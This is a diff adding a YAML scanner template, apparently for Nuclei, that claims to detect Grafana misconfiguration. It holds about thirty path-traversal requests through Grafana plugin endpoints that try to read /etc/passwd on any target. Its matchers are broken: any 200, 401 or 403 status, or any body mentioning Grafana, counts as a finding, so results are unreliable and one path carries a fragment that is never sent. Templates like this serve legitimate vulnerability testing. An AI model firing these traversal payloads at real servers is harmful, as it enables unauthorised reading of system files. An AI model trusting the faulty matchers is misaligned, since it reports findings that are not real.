@@ -1,0 +1,74 @@
+id: grafana-misconfig
+info:
+  name: Grafana Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Grafana instances with accessible plugin endpoints vulnerable to path traversal, potentially leading to system file exposure.
+  tags: grafana, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/cloudwatch/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/dashlist/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/elasticsearch/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/graph/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/graphite/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/heatmap/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/influxdb/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/mysql/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/opentsdb/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/pluginlist/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/postgres/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/prometheus/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/stackdriver/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/table/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/text/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/welcome/#/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/cloudwatch/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/dashlist/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/elasticsearch/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/graph/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/graphite/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/heatmap/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/influxdb/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/mysql/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/opentsdb/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/pluginlist/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/postgres/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/prometheus/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/stackdriver/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/table/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/text/../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:3000/public/plugins/welcome/#/../../../../../../../../../../../../../etc/passwd"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Grafana"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Grafana"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
